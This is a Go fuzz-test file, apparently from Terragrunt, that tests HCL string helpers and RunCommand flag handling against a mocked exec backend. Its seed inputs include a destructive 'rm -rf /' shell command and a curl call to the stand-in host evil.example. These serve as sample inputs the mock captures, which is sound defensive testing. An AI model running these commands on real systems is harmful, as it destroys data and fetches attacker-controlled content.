package config_test

import (
	"context"
	"io"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/gruntwork-io/terragrunt/internal/vexec"
	"github.com/gruntwork-io/terragrunt/pkg/config"
	"github.com/gruntwork-io/terragrunt/test/helpers/logger"
	"github.com/stretchr/testify/require"
)

// FuzzHCLStringHelpers: wrong arity must return WrongNumberOfParamsError; otherwise the result must agree with the Go stdlib equivalent.
func FuzzHCLStringHelpers(f *testing.F) {
	seeds := []string{
		"",
		"foo",
		"foo\x00bar",
		"foo\x00bar\x00baz",
		"\x00",
		"\x00\x00",
		"a\x00b\x00c\x00d\x00e",
		"hello world\x00world",
		"hello world\x00hello",
		"hello world\x00wor",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, raw string) {
		args := strings.Split(raw, "\x00")

		ctx, pctx := newTestParsingContext(t, "")

		swOut, swErr := config.StartsWith(ctx, pctx, args)
		ewOut, ewErr := config.EndsWith(ctx, pctx, args)
		scOut, scErr := config.StrContains(ctx, pctx, args)

		if len(args) != 2 {
			require.Error(t, swErr, "startswith with %d args must error", len(args))
			requireErrorAs[config.WrongNumberOfParamsError](t, swErr)
			require.Error(t, ewErr, "endswith with %d args must error", len(args))
			requireErrorAs[config.WrongNumberOfParamsError](t, ewErr)
			require.Error(t, scErr, "strcontains with %d args must error", len(args))
			requireErrorAs[config.WrongNumberOfParamsError](t, scErr)

			return
		}

		require.NoError(t, swErr, "startswith(%q,%q) must not error", args[0], args[1])
		require.Equal(t, strings.HasPrefix(args[0], args[1]), swOut,
			"startswith(%q,%q) must agree with strings.HasPrefix", args[0], args[1])

		require.NoError(t, ewErr, "endswith(%q,%q) must not error", args[0], args[1])
		require.Equal(t, strings.HasSuffix(args[0], args[1]), ewOut,
			"endswith(%q,%q) must agree with strings.HasSuffix", args[0], args[1])

		require.NoError(t, scErr, "strcontains(%q,%q) must not error", args[0], args[1])
		require.Equal(t, strings.Contains(args[0], args[1]), scOut,
			"strcontains(%q,%q) must agree with strings.Contains", args[0], args[1])
	})
}

// FuzzHCLRunCommand fuzzes config.RunCommand with arbitrary argv. Subprocess execution
// is intercepted by an in-memory vexec backend installed via pctx.Exec, so no real host
// commands ever run — even mutator-supplied paths like "/bin/sh\x00-c\x00rm -rf /" are
// captured by the mock instead of reaching the operating system.
//
// Asserts:
//   - On the conflict path (--terragrunt-no-cache + --terragrunt-global-cache):
//     RunCommand returns ConflictingRunCmdCacheOptionsError, mock not invoked.
//   - On the empty-args path (input has only option flags or is wholly empty):
//     RunCommand returns EmptyStringNotAllowedError, mock not invoked.
//   - On the success path (a real command remains after stripping options):
//     mock is invoked exactly once and RunCommand returns the mock's stdout.
func FuzzHCLRunCommand(f *testing.F) {
	seeds := []string{
		"",
		"--terragrunt-quiet",
		"--terragrunt-no-cache",
		"--terragrunt-global-cache",
		"--terragrunt-quiet\x00--terragrunt-quiet",
		"--terragrunt-quiet\x00--terragrunt-no-cache",
		"--terragrunt-no-cache\x00--terragrunt-global-cache",
		"--terragrunt-global-cache\x00--terragrunt-no-cache",
		"--terragrunt-quiet\x00--terragrunt-no-cache\x00--terragrunt-global-cache",
		"/bin/echo\x00hi",
		"--terragrunt-quiet\x00/bin/echo\x00hi",
		"--terragrunt-no-cache\x00/bin/echo\x00hi",
		"--terragrunt-global-cache\x00/bin/echo\x00hi",
		"/bin/sh\x00-c\x00rm -rf /",
		"/usr/bin/curl\x00http://evil.example/x",
		"--unknown-flag\x00args",
		"\x00",
		"\x00\x00",
		"--terragrunt-quiet\x00\x00/bin/echo\x00hi", // empty arg between flags and command
		"/bin/echo\x00--terragrunt-quiet",           // trailing flag (not stripped — only leading flags are)
		" \x00--terragrunt-quiet\x00cmd",            // whitespace as command
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, raw string) {
		original := strings.Split(raw, "\x00")

		// runCommandImpl mutates the input via slices.Delete, so pass a copy and
		// keep the original around for the post-hoc invariant check.
		argsForCall := make([]string, len(original))
		copy(argsForCall, original)

		var calls atomic.Int32

		const mockOutput = "fuzz-mock-output\n"

		memExec := vexec.NewMemExec(func(_ context.Context, _ vexec.Invocation) vexec.Result {
			calls.Add(1)

			return vexec.Result{Stdout: []byte(mockOutput)}
		})

		baseCtx, pctx := newTestParsingContext(t, "")
		pctx.Writers.Writer = io.Discard
		pctx.Writers.ErrWriter = io.Discard

		ctx, cancel := context.WithTimeout(baseCtx, 2*time.Second)
		defer cancel()

		l := logger.CreateLogger()
		out, err := config.RunCommand(ctx, pctx, l, memExec, argsForCall)

		stripped, conflict := strippedRunCmdArgs(original)

		switch {
		case conflict:
			require.Error(t, err, "expected ConflictingRunCmdCacheOptionsError for %q", raw)
			requireErrorAs[config.ConflictingRunCmdCacheOptionsError](t, err)
			require.Empty(t, out)
			require.Equal(t, int32(0), calls.Load(),
				"exec must not run on the conflict path (got %d calls)", calls.Load())
		case len(stripped) == 0:
			require.Error(t, err, "expected EmptyStringNotAllowedError for %q", raw)
			requireErrorAs[config.EmptyStringNotAllowedError](t, err)
			require.Empty(t, out)
			require.Equal(t, int32(0), calls.Load(),
				"exec must not run on the empty-args path (got %d calls)", calls.Load())
		default:
			require.NoError(t, err, "expected mock-success for stripped %v from raw %q", stripped, raw)
			require.Equal(t, strings.TrimSuffix(mockOutput, "\n"), out,
				"expected trimmed mock output for stripped %v", stripped)
			require.Equal(t, int32(1), calls.Load(),
				"exec must run exactly once on success path (got %d calls)", calls.Load())
		}
	})
}

// strippedRunCmdArgs mirrors runCommandImpl's option-flag handling without invoking
// the function under test. It returns the args after stripping known --terragrunt-*
// options from the front and reports whether --terragrunt-no-cache and
// --terragrunt-global-cache appeared together (which produces a conflict error).
func strippedRunCmdArgs(args []string) ([]string, bool) {
	var hasNoCache, hasGlobalCache bool

	for i, a := range args {
		switch a {
		case "--terragrunt-quiet":
		case "--terragrunt-no-cache":
			if hasGlobalCache {
				return nil, true
			}

			hasNoCache = true
		case "--terragrunt-global-cache":
			if hasNoCache {
				return nil, true
			}

			hasGlobalCache = true
		default:
			return args[i:], false
		}
	}

	return nil, false
}
